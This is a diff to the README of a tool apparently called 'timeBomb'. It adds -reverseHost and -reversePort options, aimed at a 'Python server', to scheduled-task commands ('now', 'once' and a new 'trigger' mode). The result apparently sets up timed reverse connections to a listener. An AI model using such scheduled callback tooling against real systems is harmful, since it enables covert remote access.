@@ -61,12 +61,17 @@ Tip: Give as much as possible amount of entries in -newest parameter. For exampl
 
 The task is going to run "now"
 ```
-timeBomb -task now -ip 127.0.0.1 -newest <give a big number>
+timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
 The task is going to run one time at specific time.
 ```
-timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number>
+timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
+```
+
+
+```
+timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
 
